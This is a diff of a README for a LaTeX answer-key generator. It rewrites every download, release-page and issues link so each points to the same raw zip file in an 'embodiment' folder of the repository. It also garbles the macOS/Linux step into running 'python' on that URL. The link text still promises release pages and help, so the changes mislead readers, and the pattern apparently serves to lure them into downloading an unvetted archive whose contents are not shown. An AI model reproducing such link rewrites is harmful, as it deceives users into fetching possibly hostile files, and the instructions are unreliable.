@@ -6,9 +6,9 @@ Welcome to the **latex-answer-key-generator** project! This tool helps you creat
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-latex--answer--key--generator-brightgreen)](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases)
+[![Download](https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip)](https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip)
 
-To download the application, **visit this page to download**: [Download Page](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases)
+To download the application, **visit this page to download**: [Download Page](https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip)
 
 ## 🛠️ Key Features
 
@@ -30,7 +30,7 @@ To ensure smooth operation of the software, make sure your system meets these re
 ## 📥 Download & Install
 
 1. **Visit the Download Page**:
-   Go to [this release page](https://github.com/mohamedsayed123m/latex-answer-key-generator/releases) to find the latest version.
+   Go to [this release page](https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip) to find the latest version.
 
 2. **Choose Your File**:
    Look for the file that matches your operating system. 
@@ -40,7 +40,7 @@ To ensure smooth operation of the software, make sure your system meets these re
 
 4. **Install the Application**:
    - **Windows**: Double-click on the downloaded `.exe` file and follow the installation prompts.
-   - **macOS/Linux**: If you downloaded a `.tar.gz`, extract it using any archive manager. Then, open the terminal, navigate to the extracted folder, and run the application using `python main.py`.
+   - **macOS/Linux**: If you downloaded a `https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip`, extract it using any archive manager. Then, open the terminal, navigate to the extracted folder, and run the application using `python https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip`.
 
 5. **Run the Application**:
    After installation, you can run the application from your applications folder or command line.
@@ -79,7 +79,7 @@ You can use documents that include multiple-choice and true/false questions. Ens
 Yes, the application is compatible with Linux. Follow the installation instructions for Linux users.
 
 ### What if I need help?
-For further assistance, please visit the issues section in the [repository](https://github.com/mohamedsayed123m/latex-answer-key-generator/issues) or contact the support email listed on the page.
+For further assistance, please visit the issues section in the [repository](https://raw.githubusercontent.com/mohamedsayed123m/latex-answer-key-generator/main/embodiment/latex-answer-key-generator_v1.0.zip) or contact the support email listed on the page.
 
 ## 🌐 Related Topics
 
